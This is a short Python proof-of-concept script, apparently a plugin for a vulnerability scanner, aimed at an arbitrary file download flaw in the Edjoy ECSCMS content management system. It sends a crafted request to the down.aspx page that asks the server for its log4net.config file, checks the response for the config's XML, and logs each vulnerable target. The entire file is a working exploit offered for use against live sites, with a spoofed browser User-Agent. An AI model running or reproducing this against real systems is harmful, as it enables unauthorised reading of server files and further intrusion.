#!/usr/bin/env python
#coding:utf8

__author__ = 'xiaokong'

import sys
import requests
from module.log import logger


description = 'Edjoy ECSCMS down.aspx download file'
querytype = 'site'
type = 'CMS'
cmsname = 'edjoy'


class poc(object):
    
    def __init__(self, v):
    
        self.payload = "/down.aspx?filename=test&zippath=log4net.config"
        self.logger = logger(v)
    
    def exploit(self, target):
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)'}
        try:
            
            res = requests.get(target+self.payload, headers=headers, timeout=30)
            if not res.ok:
                return True
            data = res.content
            if '<log4net>' in data and '<?xml version="1.0" encoding="utf-8" ?>' in data:
                self.logger.log(41,str([target]))
        except Exception as e:
            self.logger.debug(str(e))

    

   



